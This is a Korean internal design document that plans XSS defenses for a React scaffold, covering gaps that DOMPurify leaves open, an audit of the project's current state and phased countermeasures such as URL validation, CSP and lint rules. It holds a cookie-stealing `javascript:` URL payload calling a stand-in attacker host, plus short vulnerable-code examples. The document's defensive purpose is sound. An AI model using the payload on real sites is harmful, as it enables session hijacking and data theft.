# XSS 방어 체계 — 무엇을 만들지 정리

> **대상:** 스캐폴드에 보안 계층을 붙이는 공통 개발자, 그리고 제안서·심의 자료를 쓰는 사람.
> **이 문서의 목적:** "DOMPurify 넣었으니 XSS는 막았다"가 왜 성립하지 않는지 설명하고,
> 그 자리를 메우려면 스캐폴드에 어떤 부품을 만들어야 하는지 목록으로 정리한다.
> **상태:** 아직 아무것도 만들지 않았다. **무엇을 만들지 고르기 위한 문서**다.
> **작성:** 2026-09-03

---

## 1. 출발점 — DOMPurify는 통로 하나만 지킨다

DOMPurify가 하는 일은 한 가지다. **HTML 문자열을 화면에 그대로 꽂는 지점**에서, 위험한
태그(`<script>`)와 위험한 속성(`onerror=`, `onclick=`)을 걷어낸 뒤 돌려준다. React 코드에서
이 지점은 `dangerouslySetInnerHTML` 한 곳이다.

문제는 사용자 입력이 화면에 닿는 통로가 그것 하나가 아니라는 데 있다. 링크 주소로 들어올 수도
있고, 스타일 값으로 들어올 수도 있고, 서버가 내려준 JSON이 그대로 컴포넌트 속성이 되기도 한다.
DOMPurify는 **자기가 놓인 통로만** 검사한다. 다른 통로로 들어온 값은 검사받지 않고 지나간다.

그래서 "DOMPurify를 도입했다"는 문장은 **"통로 하나를 막았다"** 까지만 참이다. 심의에서
"나머지 통로는요?"라는 질문이 나오면 답할 것이 없어진다. 아래 2장이 그 나머지 통로다.

---

## 2. DOMPurify가 막지 못하는 것들

### 2-1. URL 스킴 인젝션 — 주소 자리로 들어오는 코드

```jsx
<a href={userInput}>링크</a>
// userInput = "javascript:fetch('//attacker.com?c='+document.cookie)"
```

`href`에 들어간 값은 HTML 문자열이 아니라 **JSX 속성 바인딩**이다. DOMPurify를 거치지 않는다.
`javascript:` 로 시작하는 주소를 넣으면 사용자가 링크를 누르는 순간 그 코드가 실행된다.
`href` 뿐 아니라 `src`, `formAction`, SVG의 `xlink:href` 가 모두 같은 성질을 갖는다.

막는 방법은 간단하다. **주소는 `http`/`https` 로 시작할 때만 통과시킨다.**

```jsx
const safeHref = /^https?:\/\//i.test(url) ? url : '#';
```

> **우리 현황:** 이 검사를 하는 유틸이 없다. 지금은 각 개발자가 알아서 써야 한다.

### 2-2. 동적 스타일 / CSS 인젝션

```jsx
<div style={{ background: `url(${userInput})` }} />
```

스타일 값도 HTML 문자열이 아니라서 sanitize 대상이 아니다. `url()` 안쪽에 값을 그대로 넣으면
괄호를 닫고 다른 선언을 이어붙이는 형태의 조작이 가능하다.

> **우리 현황:** CSS 값 이스케이프 유틸이 없다.

### 2-3. 사용자 입력을 컴포넌트 속성으로 펼치는 경우

```jsx
<Component {...userProvidedProps} />
```

서버가 내려준 JSON을 그대로 펼쳐 컴포넌트를 그리는 화면(동적 폼, 그리드 셀 렌더러)에서 흔하다.
이때 그 JSON 안에 `dangerouslySetInnerHTML: { __html: '<img onerror=...>' }` 가 섞여 있으면
**우리가 짠 코드에는 `dangerouslySetInnerHTML` 이 한 글자도 없는데도** 그 기능이 켜진다.

> **우리 현황:** 위험한 속성을 걸러내는 필터가 없다. `shared/ui/smart-table` 의 셀 렌더러가
> 이 패턴에 해당할 수 있어 확인이 필요하다.

### 2-4. eval 계열

```jsx
eval(userInput);
new Function(userInput);
setTimeout(userInput, 0);   // 문자열을 넘기면 eval 과 같다
```

문자열을 코드로 바꿔 실행하는 통로다. sanitize 와는 아무 관계가 없다.

> **우리 현황:** 전체 검색 결과 **사용처 0건**. 지금은 깨끗하지만, 앞으로 들어오지 못하게
> 막는 장치(lint 룰)가 없다.

### 2-5. 다른 출력 경로 — 우리 화면 밖

- 서버가 같은 값을 응답 헤더나 다른 API 응답에 그대로 반사하는 경우
- 다른 팀이 만든 화면이 같은 DB 값을 `innerHTML` 로 출력하는 경우

프론트에서 아무리 잘 걸러도, **저장된 값 자체가 오염돼 있으면** 그 값을 읽는 다른 화면에서
터진다. 이건 프론트가 구조적으로 막을 수 없고 **서버 측 입력 검증**이 있어야 한다.

> **우리 현황:** 이 스캐폴드는 SSR 을 쓰지 않으므로 `window.__INITIAL_STATE__` 류의
> 스크립트 주입 위험은 없다. `index.html` 의 `%VITE_*%` 치환은 빌드 시점의 `.env` 값이라
> 사용자 입력 경로가 아니다. 남는 건 **서버·타 팀 화면 쪽 리스크**이고, 이건 제안서에
> "프론트 단독으로는 해결되지 않는 항목"으로 명시하는 편이 정확하다.

### 2-6. sanitize 한 결과를 다시 만지는 경우

```jsx
const clean = DOMPurify.sanitize(html);
element.innerHTML = clean + userSuffix;  // 뒤에 붙이는 순간 검사가 무의미해진다
```

검사를 통과한 문자열이라도 **그 뒤에 무언가를 이어붙이면** 이어붙인 결과는 검사받지 않은
새로운 문자열이다. 이런 코드가 리뷰에서 걸러지려면 "sanitize 는 마지막 단계에서 한 번,
그 결과는 손대지 않는다"는 규칙이 코드로 강제돼야 한다.

### 2-7. mXSS (mutation XSS)

브라우저의 HTML 파서가 sanitize 된 문자열을 다시 읽으면서, 원래와 **다른 구조로 변형**되는
현상을 이용한 공격이다. 검사 시점에는 안전했던 문자열이 파싱 후에 위험해진다.

이 영역은 DOMPurify 가 계속 패치로 대응하는 부분이라, **버전을 고정해 두고 방치하면
시간이 지날수록 위험해진다.** 폐쇄망은 라이브러리 갱신이 늦어지기 쉬운 환경이라 특히
챙겨야 할 항목이다.

> **우리 현황:** DOMPurify 자체가 아직 없다. 도입한다면 **갱신 주기를 함께 정해야** 한다.

## 3. 지금 우리 프로젝트 상태 (실측)

| 항목 | 실측 결과 |
|---|---|
| DOMPurify | 의존성에 **없음** — sanitize 계층 자체가 존재하지 않는다 |
| `dangerouslySetInnerHTML` | **1곳** — `src/shared/components/ui/codeblock/index.tsx:105` (Shiki 문법 강조 출력) |
| `eval` / `new Function` | **0건** |
| CSP | **없음.** `index.html` 안에 인라인 `<script>`(FOUC 테마)와 인라인 `<style>`(스플래시)이 있다 |
| 토큰 저장 | **이미 대응돼 있다** — `src/config/auth.config.ts` 의 기본값이 `strategy: 'cookie'` 이고, localStorage 계열 전략을 고르면 `src/shared/auth/auth-strategies.ts:272` 에서 콘솔 경고가 뜬다 |
| ESLint 보안 룰 | **0개.** 다만 `react` 플러그인은 이미 로드돼 있어 룰만 켜면 된다 |
| SBOM | `sbom.json` (CycloneDX 1.6) 존재 — 공급망 관리 근거로 쓸 수 있다 |

정리하면 **토큰 저장 정책은 이미 절반 넘게 되어 있고, 나머지 네 갈래가 비어 있다.**

## 5. 어디에 둘 것인가 — 인증에서 쓴 배치를 그대로

이 프로젝트에는 이미 검증된 배치 방식이 있다. JWT 인증이 그렇게 되어 있다.

```
src/shared/security/**         구현. SI 프로젝트는 열지 않는다.     ← auth/** 와 같은 성격
src/config/security.config.ts  프로젝트별 확장점. SI 가 고친다.      ← auth.config.ts 와 같은 성격
src/core/**                    손대지 않는다 (core 불가침)
```

이렇게 하면 스캐폴드를 새 버전으로 반입할 때 **SI 가 고친 설정은 살아남고 구현만 갱신된다.**
인증에서 이미 쓰고 있는 방식이라 개발자에게 따로 설명할 것도 없다.

|---|---|---|
| **1차** | F(lint) + B(URL) + E(마감) | 하루 안에 끝나고 기존 코드 변경이 거의 없다. 제안서에 바로 쓸 수 있다 |
| **2차** | A(SafeHtml) + G(공급망) | 의존성 추가와 기존 예외 1건 정리가 따라온다 |
| **3차** | D(CSP) + H(테스트) + I(문서) | D 가 전체 작업량의 절반이다. H 는 싸고 효과가 크니 D 를 기다리지 말고 먼저 해도 된다 |
| **보류** | C(props) | 적용할 실사용처(smart-table 셀 렌더러 등)를 먼저 확인한 뒤 판단 |

## 8. 제안서·심의에 쓸 때

XSS 는 한 층으로 막는 것이 아니라 **여러 층으로 나눠 막고, 마지막 층이 피해를 줄이는** 구조다.

| 계층 | 수단 | 이 계획에서 |
|---|---|---|
| 입력 | 서버 측 검증 (클라이언트 검증은 우회 가능) | 프론트 범위 밖 — 서버 담당과 협의 필요 |
| 저장 | 원본을 보관하고, 처리는 출력 시점에 한다 | 정책 문서화 |
| 출력 | React 기본 이스케이프 + sanitize + URL 스킴 검증 | **A, B, C** |
| 브라우저 | CSP 헤더 (`script-src 'self'`, `unsafe-inline` 제거) | **D** |
| 피해 최소화 | 토큰을 httpOnly 쿠키에 둔다 → XSS 가 나도 탈취되지 않는다 | **E (이미 구현됨)** |

문장으로 쓸 때의 차이는 이렇다.

- 약한 표현: "DOMPurify 적용으로 XSS 방지"
  → "그 라이브러리를 안 거치는 경로는요?" 라는 질문에 답이 없다.
- 권장 표현: "출력 지점 단일화 + URL 검증 + CSP + 토큰 저장 정책 + 갱신 정책을 **체계로 제공**하고,
  공격 문자열 테스트로 동작을 확인한다"
  → 라이브러리 하나가 아니라 **스캐폴드가 제공하는 체계**라는 주장이 된다.

두 번째 표현이 스캐폴드의 가치 주장과도 맞는다. 개별 프로젝트가 매번 고민할 일을 스캐폴드가
한 번 정해서 내려보내는 것이 이 제품이 파는 것이기 때문이다.
